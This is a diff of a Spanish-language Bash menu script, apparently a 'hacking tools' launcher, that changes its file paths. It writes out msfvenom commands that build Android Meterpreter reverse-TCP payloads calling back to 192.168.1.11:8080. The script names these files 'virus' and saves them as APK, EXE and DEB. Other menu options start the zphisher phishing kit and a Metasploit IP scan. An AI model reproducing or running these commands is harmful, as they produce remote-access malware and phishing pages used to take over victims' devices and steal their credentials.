@@ -2,7 +2,7 @@
 while true; do
 	sleep 1s
 	clear
-	source /HACKING-TOOLS/colores.sh
+	source colores.sh
 	pwd=""
 	opt=""
 	#virus
@@ -57,7 +57,7 @@ ${R}[${W}00${R}]${O}Salir "
 				    	;;
 				    	1 | 01)
 							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
-							virus_apk= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/APK/${virus_name}.apk
+							virus_apk= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /virus/APK/${virus_name}.apk
 							echo virus_apk
 							clear
 							echo "${R}[${W}-${R}]${O}Guradando...${W} "
@@ -68,7 +68,7 @@ ${R}[${W}00${R}]${O}Salir "
 					    ;;
 						2 | 02)
 							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
-							virus_exe= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/EXE/${virus_name}.exe
+							virus_exe= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /virus/EXE/${virus_name}.exe
 							echo virus_exe
 							clear
 							echo "{R}[${W}-${R}]${O}Guradando...${W} "
@@ -79,7 +79,7 @@ ${R}[${W}00${R}]${O}Salir "
 						;;
 						3 | 03)
 							read -p "${R}[${W}-${R}]${G}Nombre de el achivo:${B} " virus_name
-							virus_deb= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /HACKING-TOOLS/virus/DEB/${virus_name}.deb
+							virus_deb= msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /virus/DEB/${virus_name}.deb
 							echo virus_deb
 							clear
 							echo "${R}[${W}-${R}]${O}Guradando...${W} "
@@ -104,8 +104,8 @@ ${R}[${W}00${R}]${O}Salir "
 						
 						;;
 						1 | 01)	
-							cd /HACKING-TOOLS/virus/APK/
-							virus_ls=$(ls /HACKING-TOOLS/virus/APK/  2>&1)
+							cd /virus/APK/
+							virus_ls=$(ls /virus/APK/  2>&1)
 							echo "${B}|${G}$virus_ls${B}|"
 							read -p "${R}[${W}-${R}]${G}Selection${B}  " virus_rm
 							virus_rm2= rm -f ${virus_rm}
@@ -116,8 +116,8 @@ ${R}[${W}00${R}]${O}Salir "
 
 						;;
 						2 | 02)
-							cd /HACKING-TOOLS/virus/EXE/
-							virus_ls=$(ls /HACKING-TOOLS/virus/EXE/  2>&1)
+							cd /virus/EXE/
+							virus_ls=$(ls /virus/EXE/  2>&1)
 							echo "${B}|${G}$virus_ls${B}|"
 							read -p "${R}[${W}-${R}]${G} Selection${B}  " virus_rm
 							virus_rm2= rm -f ${virus_rm}
@@ -128,8 +128,8 @@ ${R}[${W}00${R}]${O}Salir "
 
 						;;
 						3 | 03)	
-							cd /HACKING-TOOLS/virus/DEB/
-							virus_ls=$(ls /HACKING-TOOLS/virus/DEB/  2>&1)
+							cd /virus/DEB/
+							virus_ls=$(ls /virus/DEB/  2>&1)
 							echo "${B}|${G}$virus_ls${B}"
 							read -p "${R}[${W}-${R}]${G} Selection${B}  " virus_rm
 							virus_rm2= rm -f ${virus_rm}
@@ -157,17 +157,17 @@ ${R}[${W}00${R}]${O}Salir "
 							
 						;;
 						1 | 01)
-							virus_ls=$(ls /HACKING-TOOLS/virus/APK/  2>&1)
+							virus_ls=$(ls /virus/APK/  2>&1)
 							echo "${G}$virus_ls"
 							sleep 5s 
 						;;
 						2 | 02)
-							virus_ls=$(ls /HACKING-TOOLS/virus/EXE/  2>&1)
+							virus_ls=$(ls /virus/EXE/  2>&1)
 							echo "${G}$virus_ls"
 							sleep 5s
 						;;
 						3 | 03)
-							virus_ls=$(ls /HACKING-TOOLS/virus/DEB/  2>&1)
+							virus_ls=$(ls /virus/DEB/  2>&1)
 							echo "${G}$virus_ls"
 							sleep 5s
 
@@ -180,12 +180,13 @@ ${R}[${W}00${R}]${O}Salir "
 		
 		;;
 		2 | 02)
-			cd /HACKING-TOOLS/phishing/zphisher/
+			cd /phishing/zphisher/
 			bash zphisher.sh
 
 		;;
 		3 | 03)
-			cd /HACKING-TOOLS
+			cd ..
+                        cd ..
 			python3 generator.py
 
 		;;
@@ -201,7 +202,7 @@ ${R}[${W}00${R}]${O}Salir "
 				
 				;;
 				1 | 01)
-					cd /HACKING-TOOLS/Metasploit/
+					cd /Metasploit/
 					read -p "${R}[${W}-${R}]${G}Ingrese la direccion ip que desea escanear: ${B}" ip
 					read -p "${R}[${W}-${R}]${G}Ingresa nombre de el archivo donde se guradara el escaneo: " nombre
 					echo "${R}[${O}!${R}]${G}Escaneando direccion ip. Porfavor espere esto puede rtardar unos minutos."
